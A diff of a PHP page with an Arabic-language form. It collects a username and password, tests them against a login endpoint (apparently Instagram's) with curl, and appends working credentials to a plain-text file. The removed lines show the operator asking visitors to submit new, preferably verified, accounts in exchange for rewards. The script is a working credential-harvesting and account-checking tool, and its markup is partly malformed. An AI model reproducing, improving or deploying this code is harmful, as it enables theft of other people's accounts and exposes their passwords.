@@ -18,7 +18,6 @@ echo '<dv style="font-size:4:1.10em;color:#595959"> By > inst acc / click - <a  
     <input maxlength="30" style="font-size:4:1.10em;color:cyan" placeholder="الاسم"  type="text" name="ck2" value="<?= isset($_POST['ck2']) ? htmlspecialchars($_POST['ck2']) : '' ?>" />
     <input maxlength="20" style="font-size:4:1.10em;color:cyan" type="text" name="ck" placeholder="الرقم" value="<?= isset($_POST['ck']) ? htmlspecialchars($_POST['ck']) : '' ?>" />
     <input style="font-size:4:1.10em;color:red" type="submit" name="start" value=" ابدا العملية  "/>
-    <dv style="font-size:4:1.10em;color:cyan"> * مشروع دعم لكن نحتاج منكم ترسلو يوزرات جديده ولو تكون موثقه احسن وكل الي ضافو حسابات بيكون لهم شي يعجبهم او اذا خلصنا بنعطيهم اشتراك مجاني طبعا حيكون كل شي  </p>  </p> </div>
 
 
 <audio controls autoplay loop hidden>
@@ -52,14 +51,14 @@ $d = curl_exec($login);
 	
 if (strpos($d,'"authenticated": true') !== false) { 
 	        $lg =True;
-     if (strpos(file_get_contents('/fg/ac.txt'),$ps.'&='.$us) !== false) { 
+     if (strpos(file_get_contents('ac.txt'),$ps.'&='.$us) !== false) { 
                 echo '<dv style="font-size:1:1em;color:yellow"> ['.$us.'] Saved Before </div>';
                 $fc = True;
                 exit();
      }	
     if (!$fc && $lg);          
         echo '<dv style="font-size:1:1em;color:yellow"> ['.$us.'] Logged in and Saved </div>';
-	    $fx = fopen('/fg/ac.txt', 'a');
+	    $fx = fopen('ac.txt', 'a');
         fwrite($fx, $ps.'&='.$u.PHP_EOL);
 
         fclose($fx);
